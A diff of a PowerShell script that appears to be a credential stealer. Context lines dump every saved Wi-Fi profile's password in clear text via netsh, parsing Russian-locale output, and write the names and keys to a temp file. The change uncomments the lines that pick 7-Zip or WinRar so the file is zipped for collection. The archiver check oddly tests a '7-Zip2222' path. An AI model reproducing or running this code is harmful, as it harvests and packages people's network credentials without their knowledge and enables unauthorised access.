@@ -5,10 +5,10 @@ $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$p=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$p}} | Format-Table -AutoSize > $env:TEMP\w.txt
 $w=$env:TEMP+'\w.txt'
 
-# if(Test-Path -Path "C:\Program Files\7-Zip2222\7z.exe")
-#   {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
-# else
-#   {$arh="WinRar"}
+if(Test-Path -Path "C:\Program Files\7-Zip2222\7z.exe")
+  {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
+else
+  {$arh="WinRar"}
 
 if("7-Zip"-in $arh)
   {.\7z.exe a $p $w -spf -tzip}
